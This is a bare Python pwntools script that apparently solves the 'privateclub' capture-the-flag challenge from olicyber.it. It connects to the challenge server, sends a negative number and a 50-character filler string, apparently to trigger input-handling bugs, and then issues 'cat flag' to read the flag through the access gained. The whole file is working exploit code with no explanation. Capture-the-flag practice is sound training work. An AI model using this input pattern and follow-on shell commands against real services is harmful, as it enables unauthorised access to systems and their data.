#!/usr/bin/env python3
from pwn import *
r = remote("privateclub.challs.olicyber.it", 10015)
r.sendlineafter(b"?\n", str("-103").encode())
r.sendlineafter(b"?\n", str("a" * 50).encode())
print(r.recv(100))
r.sendline(str("cat flag").encode())
print(r.recv(100).decode())
